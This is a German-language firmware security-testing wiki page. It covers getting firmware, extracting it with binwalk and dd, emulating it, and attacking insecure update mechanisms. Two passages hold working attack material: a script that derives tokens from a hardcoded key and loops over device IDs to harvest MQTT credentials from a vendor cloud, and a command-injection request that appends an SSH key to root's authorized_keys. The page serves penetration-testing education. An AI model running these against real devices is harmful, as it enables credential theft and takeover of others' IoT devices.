# Firmware-Analyse

{{#include ../../banners/hacktricks-training.md}}

## **Einführung**

### Verwandte Ressourcen


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware ist essentielle Software, die Geräte korrekt funktionsfähig macht, indem sie die Kommunikation zwischen Hardwarekomponenten und der Software, mit der Benutzer interagieren, verwaltet und ermöglicht. Sie wird im permanenten Speicher abgelegt, sodass das Gerät beim Einschalten auf wichtige Anweisungen zugreifen kann, was zum Start des Betriebssystems führt. Die Untersuchung und mögliche Modifikation der Firmware ist ein entscheidender Schritt zur Identifikation von Sicherheitslücken.

## **Informationsbeschaffung**

**Informationsbeschaffung** ist ein kritischer erster Schritt, um den Aufbau eines Geräts und die verwendeten Technologien zu verstehen. Dieser Prozess beinhaltet das Sammeln von Daten zu:

- Der CPU-Architektur und dem Betriebssystem, auf dem es läuft
- Bootloader-Details
- Hardware-Layout und Datasheets
- Codebase-Metriken und Quellorten
- Externen Bibliotheken und Lizenztypen
- Update-Historie und regulatorischen Zertifizierungen
- Architektur- und Flussdiagrammen
- Sicherheitsbewertungen und identifizierten Schwachstellen

Zu diesem Zweck sind **open-source intelligence (OSINT)**-Tools sehr wertvoll, ebenso wie die Analyse sämtlicher verfügbarer Open-Source-Softwarekomponenten durch manuelle und automatisierte Review-Prozesse. Tools wie [Coverity Scan](https://scan.coverity.com) und [Semmle’s LGTM](https://lgtm.com/#explore) bieten kostenlose statische Analyse, die genutzt werden kann, um potenzielle Probleme zu finden.

## **Beschaffung der Firmware**

Das Erlangen von Firmware kann auf verschiedene Weise erfolgen, jede mit eigenem Komplexitätsgrad:

- **Direkt** von der Quelle (Entwickler, Hersteller)
- **Erstellen** aus bereitgestellten Anweisungen
- **Herunterladen** von offiziellen Supportseiten
- Nutzung von **Google dork**-Abfragen, um gehostete Firmware-Dateien zu finden
- Direkter Zugriff auf **cloud storage**, mit Tools wie [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Abfangen von **Updates** mittels man-in-the-middle-Techniken
- **Extrahieren** vom Gerät über Verbindungen wie **UART**, **JTAG** oder **PICit**
- **Sniffing** nach Update-Anfragen in der Gerätekommunikation
- Identifizieren und Verwenden von **hardcoded update endpoints**
- **Dumping** aus dem Bootloader oder Netzwerk
- **Entfernen und Auslesen** des Speicherchips, wenn alle anderen Methoden fehlschlagen, unter Verwendung geeigneter Hardware-Tools

## Analyse der Firmware

Jetzt, da du die **Firmware hast**, musst du Informationen daraus extrahieren, um zu wissen, wie du vorgehst. Verschiedene Tools, die du dafür verwenden kannst:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Wenn du mit diesen Tools nicht viel findest, prüfe die **entropy** des Image mit `binwalk -E <bin>` — bei niedriger Entropy ist es unwahrscheinlich, dass es verschlüsselt ist. Bei hoher Entropy ist es wahrscheinlich verschlüsselt (oder auf irgendeine Weise komprimiert).

Zudem kannst du diese Tools verwenden, um **im Firmware-Image eingebettete Dateien** zu extrahieren:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Oder [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) um die Datei zu inspizieren.

### Dateisystem auslesen

Mit den zuvor genannten Tools wie `binwalk -ev <bin>` solltest du in der Lage gewesen sein, **das Dateisystem zu extrahieren**.\
binwalk extrahiert es normalerweise in einen **Ordner, der nach dem Dateisystemtyp benannt ist**, welcher üblicherweise einer der folgenden ist: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manuelle Extraktion des Dateisystems

Manchmal hat binwalk **not have the magic byte of the filesystem in its signatures**. In diesen Fällen verwende binwalk, um **den Offset des Dateisystems zu finden und das komprimierte Dateisystem aus der Binärdatei zu carve** und das Dateisystem entsprechend seinem Typ **manuell zu extrahieren** unter Verwendung der folgenden Schritte.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Führe den folgenden **dd command** aus, carving the Squashfs filesystem.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternativ kann auch der folgende Befehl ausgeführt werden.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Für squashfs (im obigen Beispiel verwendet)

`$ unsquashfs dir.squashfs`

Die Dateien befinden sich anschließend im Verzeichnis "`squashfs-root`".

- CPIO-Archivdateien

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Für jffs2-Dateisysteme

`$ jefferson rootfsfile.jffs2`

- Für ubifs-Dateisysteme mit NAND-Flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Firmware analysieren

Sobald die firmware erhalten wurde, ist es wichtig, sie zu zerlegen, um ihre Struktur und mögliche Schwachstellen zu verstehen. Dieser Prozess erfordert den Einsatz verschiedener Tools, um die firmware image zu analysieren und wertvolle Daten aus dem Image zu extrahieren.

### Erste Analyse-Tools

Eine Reihe von Befehlen wird für die erste Inspektion der Binärdatei (bezeichnet als `<bin>`) bereitgestellt. Diese Befehle helfen dabei, Dateitypen zu identifizieren, Strings zu extrahieren, Binärdaten zu analysieren und Details zu Partitionen und Dateisystemen zu verstehen:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Um den Verschlüsselungsstatus des Images zu beurteilen, wird die **Entropie** mit `binwalk -E <bin>` geprüft. Niedrige Entropie deutet auf fehlende Verschlüsselung hin, während hohe Entropie mögliche Verschlüsselung oder Kompression anzeigt.

Zum Extrahieren **eingebetteter Dateien** werden Tools und Ressourcen wie die Dokumentation **file-data-carving-recovery-tools** und **binvis.io** zur Dateiansicht empfohlen.

### Extrahieren des Dateisystems

Mit `binwalk -ev <bin>` kann man normalerweise das Dateisystem extrahieren, oft in ein Verzeichnis, das nach dem Dateisystemtyp benannt ist (z. B. squashfs, ubifs). Wenn **binwalk** jedoch den Dateisystemtyp aufgrund fehlender magic bytes nicht erkennt, ist eine manuelle Extraktion nötig. Dazu verwendet man `binwalk`, um den Offset des Dateisystems zu ermitteln, und anschließend `dd`, um das Dateisystem auszuschneiden:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Anschließend werden je nach Dateisystemtyp (z. B. squashfs, cpio, jffs2, ubifs) unterschiedliche Befehle verwendet, um den Inhalt manuell zu extrahieren.

### Dateisystem-Analyse

Mit dem extrahierten Dateisystem beginnt die Suche nach Sicherheitslücken. Dabei wird auf unsichere Netzwerkdaemons, hardcodierte Zugangsdaten, API-Endpunkte, Update-Server-Funktionen, nicht kompilierten Code, Startskripte und kompilierte Binaries für die Offline-Analyse geachtet.

**Wichtige Orte** und **Elemente**, die zu prüfen sind, umfassen:

- **etc/shadow** and **etc/passwd** für Benutzeranmeldeinformationen
- SSL-Zertifikate und Schlüssel in **etc/ssl**
- Konfigurations- und Skriptdateien auf potenzielle Schwachstellen
- Eingebettete Binaries für weitere Analyse
- Gängige Webserver und Binaries von IoT-Geräten

Mehrere Tools unterstützen beim Auffinden sensibler Informationen und Schwachstellen im Dateisystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) und [**Firmwalker**](https://github.com/craigz28/firmwalker) für die Suche nach sensiblen Informationen
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) für umfassende Firmware-Analyse
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), und [**EMBA**](https://github.com/e-m-b-a/emba) für statische und dynamische Analyse

### Sicherheitsprüfungen an kompilierten Binaries

Sowohl Quellcode als auch im Dateisystem gefundene kompilierte Binaries müssen auf Schwachstellen geprüft werden. Tools wie **checksec.sh** für Unix-Binaries und **PESecurity** für Windows-Binaries helfen, ungeschützte Binaries zu identifizieren, die ausgenutzt werden könnten.

## Abrufen von Cloud-Konfiguration und MQTT-Anmeldeinformationen über abgeleitete URL-Token

Viele IoT-Hubs rufen ihre gerätespezifische Konfiguration von einem Cloud-Endpunkt ab, der wie folgt aussieht:

- `https://<api-host>/pf/<deviceId>/<token>`

Während der Firmware-Analyse kann sich herausstellen, dass `<token>` lokal aus der device ID unter Verwendung eines hardcodierten Secrets abgeleitet wird, zum Beispiel:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Dieses Design ermöglicht es jedem, der deviceId und STATIC_KEY kennt, die URL zu rekonstruieren und die Cloud-Konfiguration abzurufen, wodurch häufig Klartext-MQTT-Anmeldedaten und Topic-Präfixe offengelegt werden.

Praktische Vorgehensweise:

1) deviceId aus UART-Boot-Logs extrahieren

- Verbinde einen 3.3V UART adapter (TX/RX/GND) und erfasse die Logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Suche nach Zeilen, die das Muster der Cloud-Config-URL und die Broker-Adresse ausgeben, zum Beispiel:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) STATIC_KEY und Token-Algorithmus aus der Firmware wiederherstellen

- Lade Binärdateien in Ghidra/radare2 und suche nach dem Konfigurationspfad ("/pf/") oder nach MD5-Verwendung.
- Bestätige den Algorithmus (z. B. MD5(deviceId||STATIC_KEY)).
- Leite das Token in Bash ab und wandle den Digest in Großbuchstaben um:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Cloud-Konfiguration und MQTT-Zugangsdaten erfassen

- Setze die URL zusammen und rufe das JSON mit curl ab; parse es mit jq, um Secrets zu extrahieren:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Ausnutzen von plaintext MQTT und schwachen topic ACLs (falls vorhanden)

- Verwende wiederhergestellte credentials, um maintenance topics zu abonnieren und nach sensiblen Events zu suchen:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Vorhersehbare device IDs aufzählen (in großem Umfang, mit Autorisierung)

- Viele Ökosysteme betten Hersteller OUI/Produkt/Typ-Bytes gefolgt von einem sequentiellen Suffix ein.
- Sie können Kandidaten-IDs iterieren, Tokens ableiten und Configs programmgesteuert abrufen:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Hinweise
- Hole immer eine ausdrückliche Genehmigung ein, bevor du Massen-Enumeration durchführst.
- Bevorzuge Emulation oder statische Analyse, um Geheimnisse wiederherzustellen, ohne die Zielhardware zu verändern, wenn möglich.

Der Prozess der Emulation von Firmware ermöglicht **dynamic analysis** entweder des Betriebs eines Geräts oder eines einzelnen Programms. Dieser Ansatz kann auf Herausforderungen durch Hardware- oder Architekturabhängigkeiten stoßen, aber das Übertragen des Root-Dateisystems oder bestimmter Binärdateien auf ein Gerät mit passender Architektur und Endianness (Byte-Reihenfolge), wie z. B. ein Raspberry Pi, oder auf eine vorgefertigte virtuelle Maschine kann weitere Tests erleichtern.

### Einzelne Binärdateien emulieren

Zum Untersuchen einzelner Programme ist es entscheidend, die Endianness und die CPU-Architektur des Programms zu identifizieren.

#### Beispiel mit MIPS-Architektur

Um eine Binärdatei der MIPS-Architektur zu emulieren, kann man folgenden Befehl verwenden:
```bash
file ./squashfs-root/bin/busybox
```
Und um die notwendigen Emulationstools zu installieren:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
For MIPS (big-endian), `qemu-mips` is used, and for little-endian binaries, `qemu-mipsel` would be the choice.

#### ARM-Architektur-Emulation

Bei ARM-Binaries ist der Prozess ähnlich; der Emulator `qemu-arm` wird für die Emulation verwendet.

### Vollständige Systememulation

Tools wie [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) und andere erleichtern die vollständige Firmware-Emulation, automatisieren den Prozess und unterstützen die dynamische Analyse.

## Dynamische Analyse in der Praxis

In dieser Phase wird entweder eine reale oder emulierte Geräteumgebung zur Analyse verwendet. Es ist wichtig, Shell-Zugriff auf das OS und das Dateisystem aufrechtzuerhalten. Emulation kann Hardware-Interaktionen nicht perfekt nachbilden, was gelegentliche Neustarts der Emulation erforderlich machen kann. Die Analyse sollte das Dateisystem erneut untersuchen, offenbarte Webpages und Netzwerkdienste ausnutzen und Bootloader-Schwachstellen untersuchen. Firmware-Integritätstests sind entscheidend, um mögliche Backdoor-Schwachstellen zu identifizieren.

## Laufzeit-Analyse-Techniken

Laufzeit-Analyse umfasst das Interagieren mit einem Prozess oder Binary in seiner Betriebsumgebung und verwendet Tools wie gdb-multiarch, Frida und Ghidra, um Breakpoints zu setzen und Schwachstellen durch Fuzzing und andere Techniken zu identifizieren.

## Binary Exploitation und Proof-of-Concept

Die Entwicklung eines PoC für identifizierte Schwachstellen erfordert ein tiefes Verständnis der Zielarchitektur und Programmierung in niedrigeren Programmiersprachen. Binary-Runtime-Schutzmechanismen in Embedded-Systemen sind selten, aber falls vorhanden, können Techniken wie Return Oriented Programming (ROP) notwendig sein.

## Vorbereitete Betriebssysteme für die Firmware-Analyse

Betriebssysteme wie [AttifyOS](https://github.com/adi0x90/attifyos) und [EmbedOS](https://github.com/scriptingxss/EmbedOS) stellen vorkonfigurierte Umgebungen für Firmware-Sicherheitstests bereit, ausgestattet mit den notwendigen Tools.

## Vorgefertigte OSs zur Analyse von Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS ist eine Distro, die Ihnen dabei helfen soll, Sicherheitsbewertungen und penetration testing von Internet of Things (IoT)-Geräten durchzuführen. Sie spart viel Zeit, indem sie eine vorkonfigurierte Umgebung mit allen notwendigen Tools bereitstellt.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded-Sicherheitstest-Betriebssystem basierend auf Ubuntu 18.04, vorinstalliert mit Tools für Firmware-Sicherheitstests.

## Firmware-Downgrade-Angriffe & unsichere Update-Mechanismen

Selbst wenn ein Hersteller kryptografische Signaturprüfungen für Firmware-Images implementiert, wird **Version-Rollback-(Downgrade)-Schutz häufig ausgelassen**. Wenn der Boot- oder Recovery-Loader nur die Signatur mit einem eingebetteten Public Key prüft, aber nicht die *Version* (oder einen monotonen Zähler) des gerade geflashten Images vergleicht, kann ein Angreifer legal eine **ältere, verwundbare Firmware installieren, die immer noch eine gültige Signatur trägt**, und damit gepatchte Schwachstellen wieder einführen.

Typischer Angriffsablauf:

1. **Älteres signiertes Image beschaffen**
* Lade es vom öffentlichen Download-Portal des Herstellers, einem CDN oder der Support-Seite herunter.
* Extrahiere es aus begleitenden Mobile-/Desktop-Anwendungen (z. B. innerhalb einer Android-APK unter `assets/firmware/`).
* Hole es aus Drittanbieter-Repositorien wie VirusTotal, Internetarchiven, Foren usw.
2. **Das Image auf das Gerät hochladen oder bereitstellen** über jeden verfügbaren Update-Kanal:
* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
* Viele Consumer-IoT-Geräte stellen *unauthenticated* HTTP(S)-Endpunkte bereit, die Base64-kodierte Firmware-Blobs akzeptieren, serverseitig decodieren und eine Recovery/Upgrade auslösen.
3. Nach dem Downgrade nutze eine Schwachstelle aus, die in der neueren Version behoben wurde (zum Beispiel ein später hinzugefügter Command-Injection-Filter).
4. Optional spiele das neueste Image wieder auf oder deaktiviere Updates, um eine Entdeckung zu vermeiden, sobald Persistenz erreicht wurde.

### Beispiel: Command Injection nach Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
In der verwundbaren (downgraded) firmware wird der `md5`-Parameter direkt in einen Shell-Befehl verkettet, ohne Eingabevalidierung, wodurch beliebige Befehle eingeschleust werden können (hier – Aktivierung von SSH-Zugang per Schlüssel für root). Spätere firmware-Versionen führten einen einfachen Zeichenfilter ein, aber das Fehlen von downgrade protection macht die Korrektur wirkungslos.

### Firmware aus Mobile Apps extrahieren

Viele Anbieter bündeln komplette firmware images in ihren begleitenden mobilen Anwendungen, damit die App das Gerät über Bluetooth/Wi‑Fi aktualisieren kann. Diese Pakete werden üblicherweise unverschlüsselt im APK/APEX unter Pfaden wie `assets/fw/` oder `res/raw/` abgelegt. Tools wie `apktool`, `ghidra` oder sogar simples `unzip` erlauben es, signierte Images zu extrahieren, ohne die physische Hardware zu berühren.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Checkliste zur Bewertung der Update-Logik

* Sind Transport und Authentifizierung des *Update-Endpunkts* ausreichend geschützt (TLS + Authentifizierung)?
* Vergleicht das Gerät vor dem Flashen **Versionsnummern** oder einen **monotonen Anti‑Rollback‑Zähler**?
* Wird das Image innerhalb einer Secure‑Boot‑Kette verifiziert (z. B. Signaturen, die vom ROM‑Code geprüft werden)?
* Führt Userland‑Code zusätzliche Plausibilitätsprüfungen durch (z. B. erlaubte Partitionstabelle, Modellnummer)?
* Werden *partielle* oder *Backup*-Update‑Flows mit derselben Validierungslogik wiederverwendet?

> 💡  Wenn eines der oben genannten fehlt, ist die Plattform wahrscheinlich für Rollback‑Angriffe verwundbar.

## Verwundbare Firmware zum Üben

Um das Auffinden von Schwachstellen in Firmware zu üben, benutze die folgenden verwundbaren Firmware‑Projekte als Ausgangspunkt.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Referenzen

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## Training und Zertifizierung

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
